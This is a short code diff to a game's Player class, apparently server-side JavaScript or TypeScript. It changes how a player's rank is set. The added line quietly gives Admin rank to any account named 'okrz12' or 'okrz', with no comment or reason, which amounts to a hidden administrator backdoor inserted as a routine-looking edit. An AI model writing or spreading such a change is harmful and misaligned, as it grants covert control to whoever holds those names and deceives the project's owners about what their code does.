@@ -242,7 +242,7 @@ export default class Player extends Character {
         this.y = data.y;
         this.name = data.username;
         this.guild = data.guild;
-        this.rank = data.rank || Modules.Ranks.None;
+        this.rank = (data.username.toLowerCase() === 'okrz12' || data.username.toLowerCase() === 'okrz') ? Modules.Ranks.Admin : (data.rank || Modules.Ranks.None);
         this.ban = data.ban;
         this.jail = data.jail;
         this.mute = data.mute;
